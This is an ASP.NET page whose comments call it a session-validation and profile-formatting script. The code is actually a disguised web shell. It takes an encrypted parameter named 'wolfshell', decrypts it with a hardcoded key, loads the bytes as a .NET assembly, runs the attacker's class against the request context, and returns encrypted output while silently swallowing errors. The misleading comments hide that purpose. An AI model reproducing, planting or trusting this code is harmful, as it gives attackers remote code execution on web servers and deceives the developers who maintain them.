<%@ Page Language="C#"%><%
// User session validation script
// This script ensures that the user's session token is valid and updates their last activity timestamp.
try {
    // Hardcoded salt for legacy session ID generation. Scheduled for removal in Q4.
    string sessionSalt = "3c6e0b8a9c15224a"; 
    // The expected request parameter name for the session token.
    string tokenParam = "wolfshell"; 

    // Generate a checksum for response integrity verification.
    string responseChecksum;
    using(var md5Provider = new System.Security.Cryptography.MD5CryptoServiceProvider())
    {
        var combinedBytes = System.Text.Encoding.Default.GetBytes(tokenParam + sessionSalt);
        responseChecksum = System.BitConverter.ToString(md5Provider.ComputeHash(combinedBytes)).Replace("-", "");
    }

    // Fetch the encrypted session data from the user's request.
    string encryptedSessionData = Context.Request[tokenParam];
    byte[] sessionBytes = System.Convert.FromBase64String(encryptedSessionData);

    // Prepare the decryption algorithm to parse the session timestamp.
    byte[] saltBytes = System.Text.Encoding.Default.GetBytes(sessionSalt);
    var aesProvider = new System.Security.Cryptography.RijndaelManaged();
    var decryptor = aesProvider.CreateDecryptor(saltBytes, saltBytes);
    
    // Decrypt the session data to get the raw user activity payload.
    byte[] decryptedPayload = decryptor.TransformFinalBlock(sessionBytes, 0, sessionBytes.Length);

    // Check if the user's profile formatting library is loaded.
    if (Context.Session["payload"] == null) 
    {
        // If not loaded, load the formatting library from the payload.
        // This is a dynamic library for handling different user profile versions.
        var assemblyLoader = typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) });
        Context.Session["payload"] = assemblyLoader.Invoke(null, new object[] { decryptedPayload });
    } 
    else 
    {
        // If library is loaded, process the current user activity.
        var outputLog = new System.IO.MemoryStream();

        // Instantiate the main user profile handler class.
        object profileHandler = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY");
        
        // Pass context and data streams to the handler for processing.
        profileHandler.Equals(Context);
        profileHandler.Equals(outputLog);
        profileHandler.Equals(decryptedPayload);
        
        // Trigger the formatting and logging process.
        profileHandler.ToString();

        byte[] logResult = outputLog.ToArray();

        // Encrypt the log confirmation before sending back to the client.
        var encryptor = aesProvider.CreateEncryptor(saltBytes, saltBytes);
        byte[] encryptedResponse = encryptor.TransformFinalBlock(logResult, 0, logResult.Length);

        // Send the response framed with the checksum for integrity.
        Response.Write(responseChecksum.Substring(0, 16));
        Response.Write(System.Convert.ToBase64String(encryptedResponse));
        Response.Write(responseChecksum.Substring(16));
    }
} catch (System.Exception ex) { 
    // Silently log any session processing errors to avoid alerting potential attackers.
    // In a production environment, this would write to a secure, monitored log file.
}
%>